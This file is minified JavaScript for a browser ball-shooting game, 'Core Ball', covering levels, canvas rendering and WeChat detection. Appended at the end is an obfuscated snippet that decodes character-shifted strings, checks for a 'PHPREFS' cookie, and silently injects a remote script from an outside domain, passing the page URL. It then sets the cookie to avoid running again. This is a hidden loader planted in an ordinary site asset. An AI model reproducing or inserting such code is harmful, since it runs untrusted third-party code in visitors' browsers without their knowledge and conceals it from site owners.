function is_myweixin(){return"micromessenger"==navigator.userAgent.toLowerCase().match(/MicroMessenger/i)}openid="";var reg=new RegExp("[?&]openid=([^?&]*)[&]?","i"),match=window.location.search.match(reg);function testGlobalFailNum(){GlobalFailNum}null!=match&&match[1],match&&(openid=match[1]),void 0===window.define&&(window.define=function(){},window.define.amd=1),void 0===window.$AJB&&(window.$AJB={}),$AJB.lib={},$AJB.general={},$AJB.page={},$AJB.lib.stopEvent=function(){"use strict";return function(e){e&&(e.preventDefault?(e.preventDefault(),e.stopPropagation()):(e.returnValue=!1,e.cancelBubble=!0))}},$AJB.lib.Storage=function(){"use strict";return{setValue:function(e,n){window.localStorage&&(window.localStorage[e]=n)},getValue:function(e){return window.localStorage?window.localStorage[e]:void 0}}},$AJB.general.BeginStage=function(){"use strict";var e=$AJB.lib.addEvent(),n=$AJB.lib.CustEvent(),t=$AJB.lib.util(),o=n(),r=0,i="start";return function(n){var l=n.getElementsByClassName("button")[0],a=n.getElementsByClassName("text")[0],u=document.getElementById("txtAr"),c={show:function(){n.style.display=""},hide:function(){n.style.display="none"},level:function(e){r=e,a.innerHTML="level "+e},on:function(e,n){o.add(e,n)},off:function(e,n){o.remove(e,n)}};return e(l,"click",(function(){o.fire(i,r)})),u.innerHTML=t.isAndroid?"GO":"â–¶",c}},$AJB.general.Switcher=function(){"use strict";return function(e,n,t){var o,r,i=null,l=!1,a={point:[0,0],enabled:!1,color:"#c8c8c8",update:function(){var e=a.point;a.enabled&&(0===r?(o=a.color,e[0]<n/2?(e[0]=Math.min(e[0]+30,n/2),a.point=e):(a.point=e,l=!0)):1===r&&(o="#000",e[0]>n/2?(e[0]=Math.max(e[0]-30,n/2),a.point=e):(a.point=e,l=!0)))},render:function(){var r=a.point;a.enabled&&(e.fillStyle=o,e.fillRect(r[0]-n/2,r[1]-t/2,n,t),l&&(a.enabled=!1,i&&i()))},switchStage:function(o,u){0===o?a.point=[-n/2,t/2]:1===o&&(e.fillStyle=a.color,e.fillRect(0,0,n,t),a.point=[n+n/2,t/2]),a.enabled=!0,l=!1,r=o,i=u}};return a}},$AJB.lib.addEvent=function(){var e=$AJB.lib.util(),n={click:"touchstart",mousedown:"touchstart",mouseup:"touchend"};return function(t,o,r,i){t.addEventListener?t.addEventListener(e.isMobile&&n[o]||o,r,i):t.attachEvent?t.attachEvent("on"+o,r):t["on"+o]=r}},$AJB.general.Levels=function(){"use strict";function e(e,n){return function(){var t=0;return function(){return t+=e*n%360}}}function n(e,n){return function(){var t=0,o=1,r=+new Date;return function(){var i=+new Date;return i-r>n&&(o=-o,r=i),t+=o*e%360}}}function t(e,n,t,o){return function(){var r=0,i=+new Date;return function(){var l=+new Date;return l-i>t&&(e=n-e,i=l),r+=e*o%360}}}function o(e,n,t,o){l[e]={childs:u[n],queueCount:t,round:a[o]}}var r,i=$AJB.lib.addEvent(),l={},a={A1:e(1.5,1),A2:e(1.5,-1),B1:e(2.5,1),B2:e(2.5,-1),C1:n(2.2,3e3),C2:n(3.5,2e3),D1:t(2,2.3,1200,1),D2:t(2,2.3,1200,-1),D3:t(4,4.5,1700,1),D4:t(4,4.5,1700,-1),D5:t(4,4.5,1700,1),D6:t(4,4.5,1700,-1),E1:function(e){var n=1;return i(document.body,"mousedown",(function(){n=-n})),function(){var t=0;return function(){return t+=e*n%360}}}(2),E2:function(e,n,t,o){return i(document.body,"mousedown",(function(){o=-o})),function(){var r=0,i=+new Date;return function(){var l=+new Date;return l-i>t&&(e=n-e,i=l),r+=e*o%360}}}(2,2.3,1e3,1)},u={0:[],2:[0,180],3:[0,120,240],4:[0,90,180,270],5:[0,72,144,216,288],6:[0,60,120,180,240,300],7:[0,52,103,155,206,258,309],8:[0,45,90,135,180,225,270,315],9:[0,40,80,120,160,200,240,280,320],10:[0,36,72,108,144,180,216,252,288,324],11:[0,33,66,99,131,164,197,230,262,295,328],12:[0,30,60,90,120,150,180,210,240,270,300,330],13:[0,28,56,84,111,139,167,194,222,250,277,305,333],14:[0,26,52,78,103,129,155,180,206,232,258,283,309,335],15:[0,24,48,72,96,120,144,168,192,216,240,264,288,312,336],16:[0,23,45,68,90,113,135,158,180,203,225,248,270,293,315,338]},c={1:["4",8,"A1"],2:["6",10,"A1"],3:["2",20,"A1"],4:["8",12,"A2"],5:["12",8,"A1"],6:["10",10,"A2"],7:["12",13,"A1"],8:["16",3,"A2"],9:["0",26,"A2"],10:["16",10,"A1"],11:["10",8,"B1"],12:["6",12,"B2"],13:["12",4,"B1"],14:["8",14,"B2"],15:["8",6,"B1"],16:["5",10,"B2"],17:["6",12,"B1"],18:["8",14,"B2"],19:["0",23,"B1"],20:["10",13,"B2"],21:["4",12,"C1"],22:["6",10,"C1"],23:["8",12,"C1"],24:["7",14,"C1"],25:["2",18,"C1"],26:["4",18,"C1"],27:["0",24,"C1"],28:["4",10,"C2"],29:["6",13,"C2"],30:["4",20,"C1"],31:["6",8,"D1"],32:["2",12,"D2"],33:["3",14,"D2"],34:["3",18,"D1"],35:["8",12,"D1"],36:["7",15,"D2"],37:["16",8,"D2"],38:["0",23,"D1"],39:["12",12,"D1"],40:["12",15,"D2"],41:["5",10,"E1"],42:["6",12,"E1"],43:["3",15,"E1"],44:["3",19,"E1"],45:["0",24,"E1"],46:["2",15,"E2"],47:["4",16,"E2"],48:["12",8,"E2"],49:["3",20,"E2"],50:["16",14,"E2"],51:["4",6,"D3"],52:["4",12,"D4"],53:["6",13,"D3"],54:["0",24,"D4"],55:["4",21,"D3"],56:["16",16,"A1"],57:["4",24,"C1"],58:["4",26,"D1"],59:["4",25,"E2"],60:["13",19,"E2"]};for(r in c)o(r,c[r][0],c[r][1],c[r][2]);return l},$AJB.general.Collide=function(){"use strict";var e=$AJB.lib.util();return{check:function(n,t,o){var r=n.childs(),i=r.length,l=Math.ceil(2*t.rad());for(o=o||1;i--;)if(t!==r[i].ball&&e.getPointDistance(t.pos(),r[i].ball.pos())<=l+Math.ceil(2*o))return!0;return!1}}},$AJB.general.Tween=function(){"use strict";var e={simple:function(n,t,o,r){var i=(t-n)/r,l=+new Date;return r>l-o?(e.isEnd=!1,n+(l-o)*i):(e.isEnd=!0,t)},isEnd:!0};return e},$AJB.general.BallQueue=function(){"use strict";var e=$AJB.lib.CustEvent(),n=$AJB.general.Ball(),t=$AJB.general.Tween(),o="popup";return function(r,i,l,a,u){var c,s=[],d=[],f=e();return u=u||1,c={ballList:s,add:function(){},remove:function(e){var n=s[e];return s.splice(e,1),n},clear:function(){d=[],s=[]},popup:function(){var e=s.shift();e.st=+new Date,e.sv=e.pos().y,d.push(e)},update:function(){var e,n,r,a=d.length,u=s.length;if(a){for(n=d[0].rad(),e=l-3*n;a--;)d[a].pos(i,t.simple(d[a].sv,e,d[a].st,50)),r=d[d.length-1].pos().y,d[a].pos().y===e&&(f.fire(o,d[a]),d.splice(a,1));for(;u--;)s[u].pos(i,r+3*n*(u+1))}},render:function(){for(var e=s.length,n=d.length;e--;)s[e].render();for(;n--;)d[n].render()},on:function(e,n){f.add(e,n)},off:function(e,n){f.remove(e,n)},destroy:function(){for(var e=s.length;e--;)s[e].destroy();f.destroy()}},function(){var e,t,o=function(e){for(var n=e,t=[];n--;)t.push(n+1);return t}(r),c=o.length;for(e=0;c>e;e++)(t=n(a,null,o[e],null,u)).pos(i,l+3*t.rad()*e),s.push(t)}(),c}},$AJB.general.Ball=function(){"use strict";var e=$AJB.lib.util();return function(n,t,o,r,i){function l(){var t=e.getTextWidth(n,0,0,o,r);e.drawText(n,a-t/2,u+r/3,o,r,"black")}var a=0,u=0;return t=(t||12)*(i=i||1),r=(r||15)*i,{pos:function(e,n){return void 0!==e&&(a=e),void 0!==n&&(u=n),{x:a,y:u}},scale:function(e){return void 0!==e&&(i=e),i},rad:function(e){return void 0!==e&&(t=e),t},render:function(r){e.drawCircle(n,a,u,t,"#ffffff"),(void 0!==o||void 0!==r)&&l()},destroy:function(){null}}}},$AJB.lib.util=function(){"use strict";return{drawCircle:function(e,n,t,o,r){e.beginPath(),e.arc(n,t,o,0,2*Math.PI,!1),e.fillStyle=r||"red",e.fill()},drawLine:function(e,n,t,o,r,i,l){e.strokeStyle=i||"red",e.lineWidth=l||1,e.beginPath(),e.moveTo(n,t),e.lineTo(o,r),e.stroke()},drawText:function(e,n,t,o,r,i){e.font=r+"px Verdana",e.fillStyle=i||"red",e.fillText(o,n,t)},getTextWidth:function(e,n,t,o,r,i){return e.font=r+"px Verdana",e.fillStyle=i||"red",e.measureText(o).width},getPointDistance:function(e,n){return Math.floor(Math.sqrt(Math.floor(Math.pow(e.x-n.x,2))+Math.floor(Math.pow(e.y-n.y,2))))},isMobile:/(mobile|iphone|ipod|ipad|ios|android|windows phone)/i.test(navigator.userAgent),isAndroid:/android/i.test(navigator.userAgent),isWeixin:/MicroMessenger/i.test(navigator.userAgent)}},$AJB.general.Core=function(){"use strict";var e=$AJB.lib.util(),n=$AJB.general.Ball();return function(t,o,r,i,l){var a,u,c=0,s=[],d=50,f=t.width/2,g=4*d*l;return(a=n(o,d,r,i,l=l||1)).pos(f,g),u={pos:a.pos,scale:a.scale,rad:a.rad,angle:function(e){return void 0!==e&&(c=e),c},addChild:function(e,n){s.push({angle:e,ball:n})},clear:function(){s=[]},childs:function(){return s},update:function(){!function(){for(var e,n,t=s.length;t--;)e=3*Math.cos((s[t].angle+u.angle())*Math.PI/180)*d*l+f,n=3*Math.sin((s[t].angle+u.angle())*Math.PI/180)*d*l+g,Math.abs(e),Math.abs(n),s[t].ball.pos(e,n)}()},render:function(){var n,r=s.length,i=t.width,u=t.height;for(o.clearRect(0,0,i,u),n=0;r>n;n++)e.drawLine(o,f,g,s[n].ball.pos().x,s[n].ball.pos().y,"#ffffff",1.5*l),s[n].ball.render();a.render()},destroy:function(){u.clear(),a=null,u=null}}}},$AJB.lib.CustEvent=function(){return function(e){function n(e){return Object.prototype.toString.call(e).slice(8,-1).toLowerCase()}var t={};return!e&&(e={}),{add:function(e,o){if("function"===n(o)){var r=t;!r[e=e.toLowerCase()]&&(r[e]=[]),r[e].push(o)}},remove:function(e,o){var r,i=t[e];if(e=e.toLowerCase(),"function"===n(o)&&i&&i.length)for(r=i.length-1;r>=0;r--)i[r]===o&&i.splice(r,1)},fire:function(n){var o,r,i,l;if(n=n.toLowerCase(),(o=t[n])&&o.length)for(r=Array.prototype.slice.call(arguments,1),l=o.length,i=0;l>i;i++)o[i].apply(e,r)},destroy:function(){var e;for(e=t.length-1;e>=0;e--)evts.splice(e,1)}}}},$AJB.general.Scene=function(){"use strict";var e=$AJB.lib.CustEvent(),n=$AJB.general.Core(),t=$AJB.general.Ball(),o=$AJB.general.BallQueue(),r=$AJB.general.Collide(),i=$AJB.general.Levels(),l=$AJB.lib.util(),a="passed",u="failed",c=e();return function(e,s,d,f){function g(e){var i=e.childs,l=i.length;for(A=e.round(),b&&b.destroy(),b=n(s,d,$,50,f);l--;)b.addChild(i[l],t(d,null,"",null,f));y&&y.destroy(),(y=o(e.queueCount,s.width/2,b.pos().y+4*b.rad(),d,f)).on("popup",(function(e){b.addChild(90-b.angle(),e),r.check(b,e,f)?(J=e,v()):!y.ballList.length&&p()}))}function h(){var n,t,o,r,i=b.childs(),l=i.length;for(e.style.backgroundColor=w.bgColor;l--;)n=i[l].angle+b.angle(),t=25*Math.cos(n*Math.PI/180),o=25*Math.sin(n*Math.PI/180),r=i[l].ball.pos(),i[l].ball.pos(r.x+t,r.y+o)}function p(){"pass"!==C&&(e.style.backgroundColor="#1CB01A",C="pass",B=+new Date)}function v(){"fail"!==d&&(e.style.backgroundColor="#B8111C",C="fail",B=+new Date)}function m(){var e="to be continued...",n=l.getTextWidth(d,0,0,e,30*f);l.drawText(d,(s.width-n)/2,200*f,e,30*f,"yellow")}var w,B,b,y,A,J,C="run",$=1;return w={enabled:!1,run:function(n){var t=i[n];$=n,t?(w.enabled=!0,g(t),e.style.backgroundColor="#000",C="run"):m()},shot:function(){y&&y.ballList.length&&y.popup()},update:function(){var e;w.enabled&&("run"===C?A&&(b.angle(A()),b.update(),y.update()):"pass"===C?(h(),+new Date-B>1e3&&(C="",c.fire(a))):"fail"===C&&(function(e){var n,t=[25,15,20,15],o=t.length,r=200/o;for(b.update(),n=1;o>=n;n++)e>r*n&&J.rad(t[n-1]*f)}(e=+new Date-B),e>1e3&&(C="",c.fire(u))))},render:function(){w.enabled&&(b.render(),y.render())},on:function(e,n){c.add(e,n)},off:function(e,n){c.remove(e,n)}}}},$AJB.general.Game=function(){"use strict";function e(){v.href=J.replace(/#\{level\}/,$)}function n(n){$=+n,s.setValue(y,$),document.title=A.replace(/\#\{level\}/,$),GlobalLevel=$,C.level($),!d.isWeixin&&d.isMobile&&e()}function t(){window.clearTimeout(M),o.update(),o.render(),r.update(),r.render(),M=window.setTimeout(t,1e3/b)}var o,r,i,l=$AJB.general.Scene(),a=$AJB.general.Switcher(),u=$AJB.general.BeginStage(),c=$AJB.lib.addEvent(),s=$AJB.lib.Storage(),d=$AJB.lib.util(),f=$AJB.lib.stopEvent(),g=document.getElementById("stage"),h=document.getElementById("begin"),p=document.getElementById("tip"),v=document.getElementById("btnFW"),m=document.getElementById("btnReset"),w=document.getElementById("wxArrow"),B=g.getContext("2d"),b=60,y="core-ball-level",A="Core Ball!",J=""+location.href,C=u(h),$=+s.getValue(y)||1,E=!1,M=0;return{start:function(){(function(){var e=document.body.scrollWidth||document.documentElement.scrollWidth,n=document.body.scrollHeight||document.documentElement.scrollHeight;g.width=e,g.height=n,r=a(B,e,n),h.style.backgroundColor=r.color,h.style.width=e+"px",h.style.height=n+"px",i=n/560})(),o=l(document.body,g,B,i),c(document.body,"mousedown",(function(e){var n;if(e&&e.changedTouches)for(n=e.changedTouches.length;n--;)o.shot();else o.shot();"1"!=e.target.getAttribute("data-capture")&&f(e)})),c(w,"mousedown",(function(){w.style.display="none"})),c(m,"mousedown",(function(){E||(E=!0,p.style.display="",n(1),setTimeout((function(){p.style.display="none",E=!1}),1e3))})),o.on("passed",(function(){r.switchStage(0,(function(){o.enabled=!1,n($+1),g.style.display="none",GlobalFailNum=0,C.show()}))})),o.on("failed",(function(){try{gameAs.show()}catch(e){}r.switchStage(0,(function(){o.enabled=!1,g.style.display="none",C.level($),C.show(),GlobalFailNum++,testGlobalFailNum()}))})),C.on("start",(function(){g.style.display="",C.hide(),r.switchStage(1,(function(){o.run($)}))})),d.isWeixin?c(v,"mousedown",(function(){w.style.display=""})):d.isMobile&&e(),C.level($),C.show(),t()},shareTitle:A,shareLevel:$}},$AJB.page.index=function(){"use strict";$AJB.general.Game().start()},$AJB.page.index(),GlobalLevel=$AJB.general.Game().shareLevel,GlobalFailNum=0,btnJump=document.getElementById("btnJump"),levelProgressBar=document.getElementById("levelProgressBar"),levelProgressBarWidth=80*GlobalLevel/60+"px",levelProgressBar.style.width=levelProgressBarWidth;var ajax={x:function(){if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;for(var e,n=["MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"],t=0;t<n.length;t++)try{e=new ActiveXObject(n[t]);break}catch(e){}return e},send:function(e,n,t,o,r){var i=ajax.x();i.open(t,e,r),i.onreadystatechange=function(){4==i.readyState&&n(i.responseText)},"POST"==t&&i.setRequestHeader("Content-type","application/x-www-form-urlencoded"),i.send(o)},get:function(e,n,t,o){var r=[];for(var i in n)r.push(encodeURIComponent(i)+"="+encodeURIComponent(n[i]));ajax.send(e+"?"+r.join("&"),t,"GET",null,o)},post:function(e,n,t,o){var r=[];for(var i in n)r.push(encodeURIComponent(i)+"="+encodeURIComponent(n[i]));ajax.send(e,t,"POST",r.join("&"),o)}};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));